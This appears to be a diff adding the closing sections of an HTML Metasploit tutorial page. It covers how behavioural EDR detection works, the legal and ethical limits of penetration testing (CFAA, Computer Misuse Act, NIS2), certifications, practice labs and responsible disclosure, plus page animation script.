+    <div class="card" style="--cl:var(--orange)"><h4>Behavioural Detection</h4><p>Modern EDRs (CrowdStrike, SentinelOne, Carbon Black) use behavioural analysis — they observe what code <em>does</em>, not what it looks like. Spawning cmd.exe, injecting into lsass, calling WinAPIs for keylogging — these behaviours trigger alerts regardless of encoding. Evasion becomes much harder.</p></div>
+    <div class="card" style="--cl:var(--yellow)"><h4>Responsible Testing Note</h4><p>Testing AV bypass techniques must only be done in <strong style="color:var(--yellow)">authorised lab environments</strong>. Never upload real payloads to VirusTotal (they are shared with AV vendors). Use isolated VMs. Document all evasion techniques in your pentest report so the blue team can improve detections.</p></div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  10 — ETHICS & LAW
+═══════════════════════════ -->
+<div id="p-ethics" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 10 — Responsibility</div>
+    <h2>Ethics, Legality &amp; Responsible Use</h2>
+    <p>With great power comes great responsibility. Metasploit is a <strong style="color:var(--red)">dual-use tool</strong> — the same features that help defenders find and fix vulnerabilities can be weaponised by attackers. Understanding the legal and ethical framework is not optional — it is fundamental to every security professional.</p>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip" style="background:var(--green);box-shadow:0 0 8px var(--green);animation:none;opacity:1"></div>LEGAL FRAMEWORK — WHEN IS METASPLOIT USE LAWFUL?</div>
+    <svg viewBox="0 0 860 220" xmlns="http://www.w3.org/2000/svg">
+      <rect width="860" height="220" fill="#020305"/>
+      <defs><filter id="lg"><feGaussianBlur stdDeviation="5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>
+
+      <!-- Authorised -->
+      <rect x="15" y="20" width="390" height="180" rx="5" fill="rgba(57,211,83,.05)" stroke="rgba(57,211,83,.35)" stroke-width="2" filter="url(#lg)"/>
+      <text x="210" y="46" text-anchor="middle" font-family="Russo One" font-size="12" fill="#39d353">✅ AUTHORISED &amp; LEGAL</text>
+      <g font-family="Ubuntu Mono" font-size="8.5">
+        <text x="30" y="72" fill="#39d353">▸ Your own systems (lab, home network)</text>
+        <text x="30" y="89" fill="#39d353">▸ Written permission from system owner</text>
+        <text x="30" y="106" fill="#39d353">▸ Bug bounty programs (within stated scope)</text>
+        <text x="30" y="123" fill="#39d353">▸ CTF (Capture The Flag) competitions</text>
+        <text x="30" y="140" fill="#39d353">▸ Penetration test with signed contract</text>
+        <text x="30" y="157" fill="#39d353">▸ Dedicated lab environments (HackTheBox, TryHackMe)</text>
+        <text x="30" y="174" fill="#39d353">▸ Internal red team with executive authorisation</text>
+        <text x="30" y="191" fill="#0d3b1a">Scope of permission must be explicit and documented</text>
+      </g>
+
+      <!-- Illegal -->
+      <rect x="455" y="20" width="390" height="180" rx="5" fill="rgba(255,46,46,.06)" stroke="rgba(255,46,46,.4)" stroke-width="2"/>
+      <text x="650" y="46" text-anchor="middle" font-family="Russo One" font-size="12" fill="#ff2e2e">❌ ILLEGAL &amp; CRIMINAL</text>
+      <g font-family="Ubuntu Mono" font-size="8.5">
+        <text x="470" y="72" fill="#ff4545">▸ Any system you don't own or have written auth for</text>
+        <text x="470" y="89" fill="#ff4545">▸ "Just testing" without explicit permission</text>
+        <text x="470" y="106" fill="#ff4545">▸ Scanning/probing without authorisation</text>
+        <text x="470" y="123" fill="#ff4545">▸ Out-of-scope bug bounty targets</text>
+        <text x="470" y="140" fill="#ff4545">▸ Neighbour's WiFi, corporate networks</text>
+        <text x="470" y="157" fill="#ff4545">▸ Internet-connected systems you don't own</text>
+        <text x="470" y="174" fill="#ff4545">▸ Even "just looking" or "just checking"</text>
+        <text x="470" y="191" fill="#330a0a">Ignorance is NOT a legal defence</text>
+      </g>
+    </svg>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>RELEVANT LAWS — KNOW BEFORE YOU HACK</div>
+    <svg viewBox="0 0 860 170" xmlns="http://www.w3.org/2000/svg">
+      <rect width="860" height="170" fill="#020305"/>
+
+      <!-- US CFAA -->
+      <rect x="12" y="12" width="186" height="148" rx="4" fill="rgba(255,46,46,.05)" stroke="rgba(255,46,46,.25)" stroke-width="1.2"/>
+      <text x="105" y="34" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#ff2e2e">🇺🇸 US CFAA</text>
+      <text x="105" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#330a0a">Computer Fraud and</text>
+      <text x="105" y="61" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#330a0a">Abuse Act (1986)</text>
+      <text x="22" y="82" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">Unauthorised access:</text>
+      <text x="22" y="96" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">felony offense</text>
+      <text x="22" y="110" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">Up to 10 years prison</text>
+      <text x="22" y="124" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">for first offense</text>
+      <text x="22" y="144" font-family="Ubuntu Mono" font-size="7" fill="#ff2e2e">Aaron Swartz case</text>
+
+      <!-- UK CMA -->
+      <rect x="208" y="12" width="186" height="148" rx="4" fill="rgba(255,123,0,.05)" stroke="rgba(255,123,0,.25)" stroke-width="1.2"/>
+      <text x="301" y="34" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#ff7b00">🇬🇧 UK CMA</text>
+      <text x="301" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d2400">Computer Misuse</text>
+      <text x="301" y="61" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d2400">Act (1990)</text>
+      <text x="218" y="82" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">3 tiers:</text>
+      <text x="218" y="96" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">S1: unauth access</text>
+      <text x="218" y="110" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">S2: with intent</text>
+      <text x="218" y="124" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">S3: impair systems</text>
+      <text x="218" y="144" font-family="Ubuntu Mono" font-size="7" fill="#ff7b00">Up to 10 years</text>
+
+      <!-- EU NIS2 -->
+      <rect x="404" y="12" width="186" height="148" rx="4" fill="rgba(255,214,10,.05)" stroke="rgba(255,214,10,.25)" stroke-width="1.2"/>
+      <text x="497" y="34" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#ffd60a">🇪🇺 EU NIS2</text>
+      <text x="497" y="48" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d3f00">Network &amp; Info</text>
+      <text x="497" y="61" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d3f00">Security Directive</text>
+      <text x="414" y="82" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">Covers critical infra</text>
+      <text x="414" y="96" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">attacks. Member states</text>
+      <text x="414" y="110" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">must criminalise cyber</text>
+      <text x="414" y="124" font-family="Ubuntu Mono" font-size="7.5" fill="#6e8ca8">attacks. GDPR applies</text>
+      <text x="414" y="144" font-family="Ubuntu Mono" font-size="7" fill="#ffd60a">to data breaches</text>
+
+      <!-- General -->
+      <rect x="600" y="12" width="248" height="148" rx="4" fill="rgba(57,211,83,.05)" stroke="rgba(57,211,83,.25)" stroke-width="1.2"/>
+      <text x="724" y="34" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#39d353">🌍 GET PROTECTED</text>
+      <text x="610" y="56" font-family="Ubuntu Mono" font-size="8" fill="#39d353">✓ Always get WRITTEN permission</text>
+      <text x="610" y="72" font-family="Ubuntu Mono" font-size="8" fill="#39d353">✓ Define scope precisely (IPs, dates)</text>
+      <text x="610" y="88" font-family="Ubuntu Mono" font-size="8" fill="#39d353">✓ Sign a pentest contract</text>
+      <text x="610" y="104" font-family="Ubuntu Mono" font-size="8" fill="#39d353">✓ Report all findings immediately</text>
+      <text x="610" y="120" font-family="Ubuntu Mono" font-size="8" fill="#39d353">✓ Get hold-harmless agreement</text>
+      <text x="610" y="136" font-family="Ubuntu Mono" font-size="8" fill="#39d353">✓ Pursue CEH, OSCP, eJPT certs</text>
+      <text x="610" y="152" font-family="Ubuntu Mono" font-size="7" fill="#0d3b1a">Practice on HackTheBox, TryHackMe</text>
+    </svg>
+  </div>
+
+  <div class="three-col">
+    <div class="card" style="--cl:var(--green)">
+      <h4>Certifications for Ethical Hackers</h4>
+      <p><code>eJPT</code> — eLearnSecurity Junior Penetration Tester (beginner)<br>
+      <code>CEH</code> — Certified Ethical Hacker (EC-Council)<br>
+      <code>OSCP</code> — Offensive Security Certified Professional (hardest, most respected)<br>
+      <code>PNPT</code> — Practical Network Penetration Tester (TCM Security)<br>
+      <code>GPEN</code> — GIAC Penetration Tester</p>
+    </div>
+    <div class="card" style="--cl:var(--cyan)">
+      <h4>Safe Practice Environments</h4>
+      <p><code>HackTheBox</code> — industry-standard CTF machines<br>
+      <code>TryHackMe</code> — guided learning paths<br>
+      <code>VulnHub</code> — download VMs for local labs<br>
+      <code>Metasploitable 2/3</code> — Rapid7's vulnerable VM<br>
+      <code>DVWA</code> — Damn Vulnerable Web Application<br>
+      All explicitly authorise testing their systems.</p>
+    </div>
+    <div class="card" style="--cl:var(--violet)">
+      <h4>Responsible Disclosure</h4>
+      <p>If you find a real vulnerability in a production system (even by accident): <strong style="color:var(--violet)">stop immediately</strong>, don't exploit further, document what you found, and contact the organisation through proper channels (security@company.com) or via a bug bounty program like HackerOne or Bugcrowd. Never sell vulnerabilities to brokers.</p>
+    </div>
+  </div>
+</div>
+</div>
+
+<script>
+// ── Matrix rain canvas ──
+const canvas = document.getElementById('matrix-bg');
+const ctx = canvas.getContext('2d');
+let W, H, drops = [];
+const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()[]<>{}|\\/?;:';
+
+function resize() {
+  W = canvas.width = window.innerWidth;
+  H = canvas.height = window.innerHeight;
+  const cols = Math.floor(W / 16);
+  drops = Array.from({ length: cols }, () => Math.random() * -H / 16);
+}
+
+function matrixDraw() {
+  ctx.fillStyle = 'rgba(3,5,8,0.05)';
+  ctx.fillRect(0, 0, W, H);
+  ctx.font = '13px "Ubuntu Mono"';
+
+  drops.forEach((y, i) => {
+    const char = chars[Math.floor(Math.random() * chars.length)];
+    const intensity = Math.random();
+    if (intensity > 0.97) {
+      ctx.fillStyle = '#ff6b6b';
+    } else if (intensity > 0.93) {
+      ctx.fillStyle = '#ff2e2e';
+    } else {
+      ctx.fillStyle = `rgba(255,46,46,${0.05 + intensity * 0.25})`;
+    }
+    ctx.fillText(char, i * 16, y * 16);
+    drops[i] += 1;
+    if (drops[i] * 16 > H && Math.random() > 0.975) drops[i] = -5;
+  });
+  requestAnimationFrame(matrixDraw);
+}
+
+resize();
+window.addEventListener('resize', resize);
+matrixDraw();
+
+// ── Tab navigation ──
+function go(name, btn) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('on'));
+  document.querySelectorAll('.tab').forEach(b => b.classList.remove('on'));
+  document.getElementById('p-' + name).classList.add('on');
+  btn.classList.add('on');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+</script>
+</body>
+</html>
